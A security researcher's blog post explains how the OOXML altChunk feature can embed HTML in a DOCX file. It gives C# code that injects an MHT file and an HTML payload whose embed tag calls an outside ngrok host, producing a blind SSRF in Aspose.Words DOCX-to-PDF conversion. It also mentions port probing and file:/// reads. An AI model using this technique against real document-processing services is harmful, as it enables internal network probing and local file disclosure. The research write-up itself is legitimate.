---
layout: single
title: "Uncovering the dark magic of altChunk"
tags: altchunk docx injection
category: Web Exploitation
header:
  image: /assets/images/posts/2023-01-09-uncovering-altchunk-dangers/OpenXML.png
  caption: "Picture credit: OOXML"
  teaser: /assets/images/posts/2023-01-09-uncovering-altchunk-dangers/OpenXML.png
---

New year, new post!🥳

During a security research I found myself digging into a web application
with a DOCX upload feature. It seemed so secure: how could I break it?
I found that, in this particular case, I had to shake the foundations,
so I started reading: *Office OpenXML Reference*.

Nothing particularly interesting, until I reached this section:

![altChunkPart](/assets/images/posts/2023-01-09-uncovering-altchunk-dangers/altChunkPart.png)

My eyes started blinking: **there is an official supported feature in OpenXML standard that
let me embed an HTML page within the document!**

Reference documentation states this:
> An alternative format import part allows content specified in an alternate format specified above to be 
embedded directly in a WordprocessingML document in order to allow that content to be migrated to the 
WordprocessingML format.

### Embedding altChunk into a regular DOCX file

I wrote a simple C# program that embeds a choosen HTML/MHTML file into a DOCX:
{% highlight C# linenos %}
using DocumentFormat.OpenXml.Packaging;
using DocumentFormat.OpenXml.Wordprocessing;
using System.IO;
using System.Linq;

namespace Conversion
{
    class Program
    {
        static void Main(string[] args)
        {
            
            string fileName2 = @"C:\PathToHTMLFile\Page.mht";
            string fileName1 = @"C:\PathToOriginalDOCXFile\doc.docx";

            using (WordprocessingDocument myDoc =
                WordprocessingDocument.Open(fileName1, true))
            {
                string altChunkId = "AltChunkId1";
                MainDocumentPart mainPart = myDoc.MainDocumentPart;
                AlternativeFormatImportPart chunk =
                    mainPart.AddAlternativeFormatImportPart(
                    AlternativeFormatImportPartType.Mht, altChunkId);
                using (FileStream fileStream = File.Open(fileName2, FileMode.Open))
                    chunk.FeedData(fileStream);
                AltChunk altChunk = new AltChunk();
                altChunk.Id = altChunkId;
                mainPart.Document
                    .Body
                    .InsertAfter(altChunk, mainPart.Document.Body
                    .Elements<Paragraph>().Last());
                mainPart.Document.Save();
            }

        }
            
    }
}
{% endhighlight %}

### A Penetration Tester perspective

Even if *altChunk* simplifies a lot document creation, it can be misused
by an attacker. In fact it allows us to write HTML code that will be converted
in *WordProcessingML* XML tags by Word internal engine or by associated parsing
libraries.

We could possibly achieve things like:
- XSS
- SSRF

up to

- RCE

Let's dive into a real world example...

### Aspose.Words and altChunks

Let's suppose we have an application that converts any DOCX file to PDF.
Inspecting its behaviour we notice that we can't trigger anything harmful
by using macro, OLE objects, Fields and/or XXE.

![homepage](/assets/images/posts/2023-01-09-uncovering-altchunk-dangers/homepage.png)

> *So ugly, but we are interested in content, not shape!*

Fortunately above feature comes to help us.
By injecting in an HTML file this code block:

{% highlight HTML linenos %}
<!DOCTYPE html>
<html>
    <head>
    </head>
    <body>
        <embed src="http://75bb-80-104-79-137.ngrok.io/a.png"></embed>
    </body>
</html>
{% endhighlight %}

and then encapsulating it in the malicious
DOCX file, we can force Word or a library to resolve this address while constructing
output PDF.

![Blind SSRF](/assets/images/posts/2023-01-09-uncovering-altchunk-dangers/blindssrf.png)

 We have in fact achieved a **Blind SSRF**.

We could then try these things:
- Check open/closed ports by observing timing response
- Open images by using any supported URI scheme (yes, even *file:///*)

> NOTE: Above attack/behaviour works in the latest Aspose.Words package. I haven't tried other
packages yet, but this feature cannot be underestimated.

**Stay tuned!**

> PS: Let me know in comments if you find another misuse of this feature!